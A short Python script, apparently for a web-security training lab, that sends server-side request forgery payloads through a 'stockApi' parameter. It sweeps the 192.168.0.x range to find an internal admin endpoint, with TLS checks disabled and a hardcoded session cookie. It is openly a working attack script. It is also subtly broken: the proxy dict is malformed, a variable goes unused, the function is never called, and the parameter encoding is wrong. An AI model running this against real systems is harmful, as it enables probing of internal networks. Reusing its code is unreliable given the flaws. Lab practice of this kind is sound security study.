import requests
import sys
import urllib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#proxies = {'http' : 'http://127.0.0.1:8080' , 'https://127.0.0.1:8080'}

def SSRF_response(url):
    correct_ip = ""
    for i in range(1,254):
        ssrf_payload = "stockApi = http://192.168.0.%s:8080/admin" % i
        ssrf_payload_encoded = urllib.parse.quote(ssrf_payload)
        cookies = {'session' : '510eaFfi1htpngbHpAMw59EN1fN6vwdK'}
        r = requests.post(url, cookies=cookies, data=ssrf_payload_encoded, verify=False)
        if r.status_code == 200:
            print(f"SSRF payload with the IP 192.168.0.{i} was succesfull")
            exit()
        else:
            print(f"SSRF payload with the IP 192.168.0.{i} failed")
        


